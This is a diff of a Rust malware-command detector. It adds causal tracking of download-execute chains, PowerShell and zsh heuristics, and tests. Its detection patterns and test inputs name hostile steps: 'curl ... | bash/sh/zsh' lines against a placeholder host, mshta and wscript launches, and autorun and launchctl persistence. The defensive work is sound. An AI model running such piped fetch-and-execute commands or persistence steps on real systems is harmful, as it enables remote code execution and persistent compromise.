@@ -1,16 +1,17 @@
 use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
 use emulator_core::{
-    sha256_hex, AnalysisLimits, Artifact, EventKind, HostPlatform, HostSnapshot, Ioc,
-    NetworkActivity, NetworkPolicy, TraceEvent, VirtualDirectorySnapshot, VirtualFileSnapshot,
+    sha256_hex, AnalysisLimits, Artifact, BinaryInspectionRecord, CausalEdge, CausalEntity,
+    CausalRelation, EventKind, HostPlatform, HostSnapshot, InspectionStatus, Ioc, NetworkActivity,
+    NetworkPolicy, TraceEvent, VirtualDirectorySnapshot, VirtualFileSnapshot,
 };
 use runbox_emulator::{Runbox, RunboxError, RunboxInput};
 use serde::{Deserialize, Serialize};
-use std::collections::BTreeSet;
+use std::collections::{BTreeMap, BTreeSet};
 use std::sync::LazyLock;
 use thiserror::Error;
 use url::Url;
 
-pub const REPORT_SCHEMA_VERSION: &str = "3";
+pub const REPORT_SCHEMA_VERSION: &str = "5";
 pub const MAX_DETECTOR_INPUT_BYTES: usize = 1024 * 1024;
 pub const DEFAULT_SAFE_SOURCE_URLS: &[&str] = &["https://gh.io/copilot-install"];
 
@@ -230,6 +231,10 @@ pub struct AnalysisReport {
     pub artifacts: Vec<Artifact>,
     pub virtual_files: Vec<VirtualFileSnapshot>,
     pub virtual_directories: Vec<VirtualDirectorySnapshot>,
+    #[serde(default)]
+    pub binary_inspections: Vec<BinaryInspectionRecord>,
+    #[serde(default)]
+    pub causal_edges: Vec<CausalEdge>,
     pub network_urls: Vec<String>,
     pub network_activity: Vec<NetworkActivity>,
     pub safe_network_urls: Vec<String>,
@@ -596,6 +601,9 @@ impl Detector {
     #[must_use]
     pub fn infer_input_kind(content: &str) -> InputKind {
         let lowercase = content.to_ascii_lowercase();
+        if looks_like_powershell_script(content, &lowercase) {
+            return InputKind::PowerShellScript;
+        }
         if looks_like_macos_shell(&lowercase) {
             return InputKind::BashScript;
         }
@@ -605,15 +613,7 @@ impl Detector {
         if Self::prefilter(content).decision == PrefilterDecision::DefinitelyBenign {
             return InputKind::RawCommand;
         }
-        if content.contains('\n')
-            || content.trim_start().starts_with('$')
-            || lowercase.contains("invoke-webrequest")
-            || lowercase.contains("invoke-restmethod")
-            || lowercase.contains("invoke-expression")
-            || lowercase.contains("set-content")
-            || lowercase.contains("[system.")
-            || lowercase.contains("[text.")
-        {
+        if content.contains('\n') || content.trim_start().starts_with('$') {
             InputKind::PowerShellScript
         } else {
             InputKind::RawCommand
@@ -729,6 +729,8 @@ impl Detector {
             artifacts: snapshot.artifacts,
             virtual_files: snapshot.virtual_files,
             virtual_directories: snapshot.virtual_directories,
+            binary_inspections: snapshot.binary_inspections,
+            causal_edges: snapshot.causal_edges,
             network_urls,
             network_activity: snapshot.network_activity,
             safe_network_urls,
@@ -795,6 +797,9 @@ const fn input_kind_name(kind: InputKind) -> &'static str {
 fn looks_like_macos_shell(lowercase: &str) -> bool {
     lowercase.contains("launchctl")
         || lowercase.contains("osascript")
+        || lowercase.contains("| zsh")
+        || lowercase.contains("|zsh")
+        || lowercase.contains("| /bin/zsh")
         || lowercase.contains("chmod +x")
         || lowercase.contains("/library/launchagents")
         || lowercase.contains("/library/launchdaemons")
@@ -817,7 +822,9 @@ fn looks_like_linux_shell(content: &str, lowercase: &str) -> bool {
         || lowercase.contains("/proc/")
         || lowercase.contains("curl") && lowercase.contains("| bash")
         || lowercase.contains("wget") && lowercase.contains("| bash")
-        || lowercase.contains("${")
+        || lowercase.contains("curl") && lowercase.contains("| sh")
+        || lowercase.contains("wget") && lowercase.contains("| sh")
+        || lowercase.contains("${") && !lowercase.contains("${env:")
         || contains_shell_assignment(content)
         || content.contains('\n')
             && (lowercase.contains("export ")
@@ -825,6 +832,20 @@ fn looks_like_linux_shell(content: &str, lowercase: &str) -> bool {
                 || lowercase.contains("; do")
                 || lowercase.contains("\nthen")
                 || lowercase.contains("\ndo"))
+}
+
+fn looks_like_powershell_script(content: &str, lowercase: &str) -> bool {
+    content.trim_start().starts_with('$')
+        || lowercase.contains("$env:")
+        || lowercase.contains("${env:")
+        || lowercase.contains("invoke-webrequest")
+        || lowercase.contains("invoke-restmethod")
+        || lowercase.contains("invoke-expression")
+        || lowercase.contains("set-content")
+        || lowercase.contains("start-process")
+        || lowercase.contains("[system.")
+        || lowercase.contains("[text.")
+        || lowercase.contains("[environment]::")
 }
 
 fn contains_shell_assignment(content: &str) -> bool {
@@ -882,6 +903,8 @@ fn prefilter_benign_report(
         artifacts: Vec::new(),
         virtual_files: Vec::new(),
         virtual_directories: Vec::new(),
+        binary_inspections: Vec::new(),
+        causal_edges: Vec::new(),
         network_urls: Vec::new(),
         network_activity: Vec::new(),
         safe_network_urls: Vec::new(),
@@ -945,6 +968,23 @@ pub fn render_human(report: &AnalysisReport) -> String {
             ));
         }
     }
+    if !report.binary_inspections.is_empty() {
+        output.push_str("\nBinary inspections\n");
+        for record in &report.binary_inspections {
+            let inspection = &record.inspection;
+            output.push_str(&format!(
+                "- {:?} {:?} {} bytes, sha256 {}",
+                inspection.format, inspection.kind, inspection.original_size, inspection.sha256
+            ));
+            if !inspection.architectures.is_empty() {
+                output.push_str(&format!(" [{}]", inspection.architectures.join(", ")));
+            }
+            if inspection.status == InspectionStatus::Partial {
+                output.push_str(" (partial)");
+            }
+            output.push('\n');
+        }
+    }
     if !report.network_activity.is_empty() {
         output.push_str("\nNetwork activity\n");
         for activity in &report.network_activity {
@@ -994,16 +1034,21 @@ fn evaluate_rules(
         .filter(|url| safe_sources.is_safe(url))
         .map(str::to_owned)
         .collect::<BTreeSet<_>>();
-    let all_network_sources_safe = !snapshot.network_activity.is_empty()
-        && snapshot
-            .network_activity
-            .iter()
-            .flat_map(network_activity_urls)
-            .all(|url| safe_sources.is_safe(url));
-    let trusted_remote_msi = all_network_sources_safe
-        && safe_source_segment_matches(input, &safe_urls, &["msiexec"], &[]);
-    let trusted_remote_script_host = all_network_sources_safe
-        && safe_source_segment_matches(input, &safe_urls, &["mshta", "wscript", "cscript"], &[]);
+    let causal_execution_chains = causal_execution_chains(snapshot);
+    let trusted_remote_msi =
+        safely_sourced_network_process(snapshot, safe_sources, &["msiexec", "msiexec.exe"]);
+    let trusted_remote_script_host = safely_sourced_network_process(
+        snapshot,
+        safe_sources,
+        &[
+            "mshta",
+            "mshta.exe",
+            "wscript",
+            "wscript.exe",
+            "cscript",
+            "cscript.exe",
+        ],
+    );
     if !safe_urls.is_empty() {
         findings.push(Finding {
             rule_id: "source.safe-network".into(),
@@ -1256,25 +1301,55 @@ fn evaluate_rules(
     let has_download = contains_any(&lowercase, &downloads);
     let has_execution = contains_any(&lowercase, &executions);
     let has_extraction = contains_any(&lowercase, &["expand-archive", "tar.exe", " tar "]);
-    let trusted_download_execution = all_network_sources_safe
-        && safe_source_segment_matches(input, &safe_urls, &downloads, &executions);
-    if !trusted_download_execution && has_download && has_extraction && has_execution {
+    let causal_download_evidence = causal_execution_chains
+        .iter()
+        .map(|chain| format!("network-derived content executed by {}", chain.process))
+        .take(10)
+        .collect::<Vec<_>>();
+    let causal_download_execution = !causal_download_evidence.is_empty();
+    let causal_direct_execution_evidence = causal_execution_chains
+        .iter()
+        .filter(|chain| {
+            !chain
+                .entities
+                .iter()
+                .any(|entity| matches!(entity, CausalEntity::VirtualFile { .. }))
+        })
+        .map(|chain| format!("network-derived stream executed by {}", chain.process))
+        .take(10)
+        .collect::<Vec<_>>();
+    let trusted_download_execution = !causal_execution_chains.is_empty()
+        && causal_execution_chains
+            .iter()
+            .all(|chain| causal_chain_is_safe(snapshot, chain, safe_sources));
+    if !trusted_download_execution
+        && has_extraction
+        && (causal_download_execution || has_download && has_execution)
+    {
         findings.push(Finding {
             rule_id: "chain.download-extract-execute".into(),
             title: "Payload downloads, extracts, and executes staged content".into(),
             severity: Severity::Critical,
             score: 45,
-            evidence: vec![
-                "input contains download, archive extraction, and execution stages".into(),
-            ],
+            evidence: if causal_download_evidence.is_empty() {
+                vec!["input contains download, archive extraction, and execution stages".into()]
+            } else {
+                causal_download_evidence.clone()
+            },
         });
-    } else if !trusted_download_execution && has_download && has_execution {
+    } else if !trusted_download_execution
+        && (!causal_direct_execution_evidence.is_empty() || has_download && has_execution)
+    {
         findings.push(Finding {
             rule_id: "chain.download-execute".into(),
             title: "Payload combines remote retrieval with subsequent execution".into(),
             severity: Severity::Critical,
             score: 45,
-            evidence: vec!["input contains both download and execution primitives".into()],
+            evidence: if causal_direct_execution_evidence.is_empty() {
+                vec!["input contains both download and execution primitives".into()]
+            } else {
+                causal_direct_execution_evidence
+            },
         });
     }
     let network_evidence = unique_event_evidence(snapshot, EventKind::NetworkIntent);
@@ -1550,23 +1625,6 @@ fn evaluate_rules(
     findings
 }
 
-fn safe_source_segment_matches(
-    input: &str,
-    safe_urls: &BTreeSet<String>,
-    first_group: &[&str],
-    second_group: &[&str],
-) -> bool {
-    input.split([';', '\n', '\r']).any(|segment| {
-        let lowercase = segment.to_ascii_lowercase();
-        let has_safe_url = safe_urls
-            .iter()
-            .any(|url| lowercase.contains(&url.to_ascii_lowercase()));
-        has_safe_url
-            && (first_group.is_empty() || contains_any(&lowercase, first_group))
-            && (second_group.is_empty() || contains_any(&lowercase, second_group))
-    })
-}
-
 fn add_text_rule(
     findings: &mut Vec<Finding>,
     lowercase_input: &str,
@@ -1596,101 +1654,198 @@ fn contains_any(input: &str, needles: &[&str]) -> bool {
     needles.iter().any(|needle| input.contains(needle))
 }
 
-fn download_write_execute_evidence(snapshot: &HostSnapshot) -> Vec<String> {
-    let source_sequences = snapshot
-        .trace
+#[derive(Debug, Clone)]
+struct CausalExecutionPath {
+    start: CausalEntity,
+    entities: Vec<CausalEntity>,
+    relations: Vec<CausalRelation>,
+    process: String,
+}
+
+fn causal_execution_chains(snapshot: &HostSnapshot) -> Vec<CausalExecutionPath> {
+    causal_execution_paths(
+        snapshot,
+        (1..=snapshot.network_activity.len()).map(|id| CausalEntity::NetworkActivity { id }),
+    )
+}
+
+fn causal_execution_paths(
+    snapshot: &HostSnapshot,
+    starts: impl IntoIterator<Item = CausalEntity>,
+) -> Vec<CausalExecutionPath> {
+    let mut adjacency = BTreeMap::<CausalEntity, Vec<&CausalEdge>>::new();
+    for edge in &snapshot.causal_edges {
+        adjacency.entry(edge.from.clone()).or_default().push(edge);
+    }
+    let mut paths = Vec::new();
+    for start in starts {
+        let mut stack = vec![(
+            start.clone(),
+            vec![start.clone()],
+            Vec::<CausalRelation>::new(),
+        )];
+        while let Some((node, entities, relations)) = stack.pop() {
+            if entities.len() >= 16 {
+                continue;
+            }
+            for edge in adjacency.get(&node).into_iter().flatten() {
+                if entities.contains(&edge.to) {
+                    continue;
+                }
+                let mut next_entities = entities.clone();
+                next_entities.push(edge.to.clone());
+                let mut next_relations = relations.clone();
+                next_relations.push(edge.relation);
+                if let CausalEntity::Process { command_line } = &edge.to {
+                    if edge.relation == CausalRelation::Executed {
+                        paths.push(CausalExecutionPath {
+                            start: start.clone(),
+                            entities: next_entities,
+                            relations: next_relations,
+                            process: command_line.clone(),
+                        });
+                    }
+                } else {
+                    stack.push((edge.to.clone(), next_entities, next_relations));
+                }
+            }
+        }
+    }
+    paths.sort_by(|left, right| {
+        left.process
+            .cmp(&right.process)
+            .then_with(|| left.entities.cmp(&right.entities))
+    });
+    paths.dedup_by(|left, right| left.process == right.process && left.entities == right.entities);
+    paths
+}
+
+fn causal_chain_is_safe(
+    snapshot: &HostSnapshot,
+    chain: &CausalExecutionPath,
+    safe_sources: &SafeSourcePolicy,
+) -> bool {
+    let CausalEntity::NetworkActivity { id } = chain.start else {
+        return false;
+    };
+    snapshot
+        .network_activity
+        .get(id.saturating_sub(1))
+        .is_some_and(|activity| {
+            network_activity_urls(activity).all(|url| safe_sources.is_safe(url))
+        })
+}
+
+fn safely_sourced_network_process(
+    snapshot: &HostSnapshot,
+    safe_sources: &SafeSourcePolicy,
+    programs: &[&str],
+) -> bool {
+    let matching = snapshot
+        .causal_edges
         .iter()
-        .filter(|event| event.kind == EventKind::NetworkIntent)
-        .map(|event| event.sequence)
+        .filter_map(|edge| {
+            let CausalEntity::NetworkActivity { id } = edge.from else {
+                return None;
+            };
+            let CausalEntity::Process { command_line } = &edge.to else {
+                return None;
+            };
+            let program = command_line
+                .split_whitespace()
+                .next()
+                .unwrap_or_default()
+                .trim_matches('"')
+                .rsplit(['\\', '/'])
+                .next()
+                .unwrap_or_default();
+            programs
+                .iter()
+                .any(|candidate| program.eq_ignore_ascii_case(candidate))
+                .then_some(id)
+        })
         .collect::<Vec<_>>();
-    write_execute_evidence_after(snapshot, &source_sequences)
+    !matching.is_empty()
+        && matching.into_iter().all(|id| {
+            snapshot
+                .network_activity
+                .get(id.saturating_sub(1))
+                .is_some_and(|activity| {
+                    network_activity_urls(activity).all(|url| safe_sources.is_safe(url))
+                })
+        })
+}
+
+fn download_write_execute_evidence(snapshot: &HostSnapshot) -> Vec<String> {
+    causal_execution_chains(snapshot)
+        .into_iter()
+        .filter_map(|chain| {
+            let files = chain
+                .entities
+                .iter()
+                .filter_map(|entity| match entity {
+                    CausalEntity::VirtualFile { path } => Some(path.as_str()),
+                    _ => None,
+                })
+                .collect::<Vec<_>>();
+            (!files.is_empty()).then(|| {
+                format!(
+                    "network activity produced {} and executed {}",
+                    files.join(", "),
+                    chain.process
+                )
+            })
+        })
+        .take(10)
+        .collect()
 }
 
 fn decode_write_execute_evidence(snapshot: &HostSnapshot) -> Vec<String> {
-    let source_sequences = snapshot
-        .trace
-        .iter()
-        .filter(|event| event.kind == EventKind::Decode)
-        .map(|event| event.sequence)
-        .collect::<Vec<_>>();
-    write_execute_evidence_after(snapshot, &source_sequences)
-}
-
-fn write_execute_evidence_after(
-    snapshot: &HostSnapshot,
-    source_sequences: &[usize],
-) -> Vec<String> {
-    let process_events = snapshot
-        .trace
-        .iter()
-        .filter(|event| event.kind == EventKind::ProcessIntent)
-        .collect::<Vec<_>>();
-    snapshot
-        .trace
-        .iter()
-        .filter(|event| event.kind == EventKind::FileWrite)
-        .filter_map(|write| {
-            let path = write.data.get("path")?;
-            let normalized_path = normalize_for_correlation(path);
-            let executable = looks_executable(path)
-                || write
-                    .data
-                    .get("entry_type")
-                    .is_some_and(|entry_type| entry_type == "executable")
-                || snapshot.virtual_files.iter().any(|file| {
-                    file.executable && normalize_for_correlation(&file.path) == normalized_path
-                });
-            if path.is_empty() || !executable {
-                return None;
-            }
-            if !source_sequences
-                .iter()
-                .any(|sequence| *sequence < write.sequence)
-            {
-                return None;
-            }
-            let process = process_events.iter().find(|process| {
-                process.sequence > write.sequence
-                    && (process.data.get("command_line").is_some_and(|command| {
-                        normalize_for_correlation(command).contains(&normalized_path)
-                    }) || process.data.get("program").is_some_and(|program| {
-                        normalize_for_correlation(program) == normalized_path
-                    }))
-            })?;
-            Some(format!("{} followed by {}", write.message, process.message))
-        })
-        .collect::<BTreeSet<_>>()
-        .into_iter()
-        .take(10)
-        .collect()
+    causal_execution_paths(
+        snapshot,
+        snapshot
+            .artifacts
+            .iter()
+            .map(|artifact| CausalEntity::Artifact { id: artifact.id }),
+    )
+    .into_iter()
+    .filter(|path| path.relations.contains(&CausalRelation::Decoded))
+    .map(|path| format!("decoded artifact was executed by {}", path.process))
+    .take(10)
+    .collect()
 }
 
 fn autorun_download_evidence(snapshot: &HostSnapshot) -> Vec<String> {
-    let network_sequences = snapshot
-        .trace
-        .iter()
-        .filter(|event| event.kind == EventKind::NetworkIntent)
-        .map(|event| event.sequence)
-        .collect::<Vec<_>>();
-    snapshot
-        .trace
-        .iter()
-        .filter(|event| event.kind == EventKind::FileWrite)
-        .filter_map(|write| {
-            let path = write.data.get("path")?.to_ascii_lowercase();
-            if !is_autorun_path(&path)
-                || !network_sequences
-                    .iter()
-                    .any(|sequence| *sequence < write.sequence)
-            {
-                return None;
+    let mut adjacency = BTreeMap::<CausalEntity, Vec<&CausalEdge>>::new();
+    for edge in &snapshot.causal_edges {
+        adjacency.entry(edge.from.clone()).or_default().push(edge);
+    }
+    let mut evidence = BTreeSet::new();
+    for id in 1..=snapshot.network_activity.len() {
+        let start = CausalEntity::NetworkActivity { id };
+        let mut stack = vec![(start.clone(), vec![start])];
+        while let Some((node, path)) = stack.pop() {
+            if path.len() >= 16 {
+                continue;
             }
-            Some(write.message.clone())
-        })
-        .collect::<BTreeSet<_>>()
-        .into_iter()
-        .take(10)
-        .collect()
+            for edge in adjacency.get(&node).into_iter().flatten() {
+                if path.contains(&edge.to) {
+                    continue;
+                }
+                if let CausalEntity::VirtualFile { path: file } = &edge.to {
+                    if is_autorun_path(&file.to_ascii_lowercase()) {
+                        evidence.insert(format!("network content wrote autorun file {file}"));
+                    }
+                }
+                if !matches!(edge.to, CausalEntity::Process { .. }) {
+                    let mut next = path.clone();
+                    next.push(edge.to.clone());
+                    stack.push((edge.to.clone(), next));
+                }
+            }
+        }
+    }
+    evidence.into_iter().take(10).collect()
 }
 
 fn is_autorun_path(path: &str) -> bool {
@@ -1712,23 +1867,6 @@ fn is_autorun_path(path: &str) -> bool {
     ]
     .iter()
     .any(|location| path.contains(location))
-}
-
-fn looks_executable(path: &str) -> bool {
-    [
-        ".bat", ".cmd", ".com", ".dll", ".exe", ".hta", ".js", ".jse", ".msi", ".ps1", ".sct",
-        ".vbe", ".vbs", ".wsf",
-    ]
-    .iter()
-    .any(|extension| path.to_ascii_lowercase().ends_with(extension))
-}
-
-fn normalize_for_correlation(value: &str) -> String {
-    let mut normalized = value.to_ascii_lowercase().replace('/', "\\");
-    while normalized.contains("\\\\") {
-        normalized = normalized.replace("\\\\", "\\");
-    }
-    normalized
 }
 
 fn unique_event_evidence(snapshot: &HostSnapshot, kind: EventKind) -> Vec<String> {
@@ -1790,10 +1928,17 @@ fn assess_confidence(snapshot: &HostSnapshot) -> Confidence {
         .filter(|file| file.size == 0)
         .count()
         .saturating_mul(5);
+    let partial_binary_penalty = snapshot
+        .binary_inspections
+        .iter()
+        .filter(|record| record.inspection.status == InspectionStatus::Partial)
+        .count()
+        .saturating_mul(10);
     let penalty = unsupported_penalty
         .saturating_add(limit_penalty)
         .saturating_add(empty_artifact_penalty)
         .saturating_add(empty_file_penalty)
+        .saturating_add(partial_binary_penalty)
         .min(80);
     let score = u8::try_from(100_usize.saturating_sub(penalty)).unwrap_or(20);
     Confidence {
@@ -1954,6 +2099,14 @@ mod tests {
             .findings
             .iter()
             .any(|finding| finding.rule_id == "persistence.autorun-download"));
+        assert!(report.causal_edges.iter().any(|edge| {
+            edge.relation == CausalRelation::Downloaded
+                && matches!(
+                    &edge.to,
+                    CausalEntity::VirtualFile { path }
+                        if path.to_ascii_lowercase().contains(r"\startup\update.cmd")
+                )
+        }));
     }
 
     #[test]
@@ -1973,6 +2126,15 @@ mod tests {
             .findings
             .iter()
             .any(|finding| finding.rule_id.starts_with("chain.")));
+        assert!(report.causal_edges.iter().any(|edge| {
+            edge.relation == CausalRelation::Executed
+                && matches!(edge.from, CausalEntity::NetworkActivity { .. })
+                && matches!(
+                    &edge.to,
+                    CausalEntity::Process { command_line }
+                        if command_line.starts_with("bash")
+                )
+        }));
     }
 
     #[test]
@@ -2015,6 +2177,22 @@ launchctl load "$HOME/Library/LaunchAgents/com.example.update.plist"
         assert_eq!(
             Detector::infer_input_kind("name=world; echo \"$name\""),
             InputKind::LinuxShellScript
+        );
+    }
+
+    #[test]
+    fn automatic_kind_inference_distinguishes_zsh_and_powershell_environment_syntax() {
+        assert_eq!(
+            Detector::infer_input_kind("curl -fsSL https://example.invalid/payload | zsh"),
+            InputKind::BashScript
+        );
+        assert_eq!(
+            Detector::infer_input_kind("curl -fsSL https://example.invalid/payload | bash"),
+            InputKind::LinuxShellScript
+        );
+        assert_eq!(
+            Detector::infer_input_kind("Write-Output ${env:Path}"),
+            InputKind::PowerShellScript
         );
     }
 
@@ -2072,6 +2250,17 @@ systemctl enable --now /etc/systemd/system/example.service
             .unwrap();
         assert_eq!(mixed.verdict, Verdict::Malicious);
         assert_eq!(mixed.safe_network_urls, ["https://gh.io/copilot-install"]);
+    }
+
+    #[test]
+    fn safe_source_matching_rejects_punycode_masking() {
+        let mut policy = SafeSourcePolicy::empty();
+        policy.add_exact_url("https://example.org/tool").unwrap();
+
+        assert!(!policy.is_safe("https://xn--example-.org/tool"));
+        assert!(policy
+            .add_exact_url("https://example.org.xn--/tool")
+            .is_err());
     }
 
     #[test]
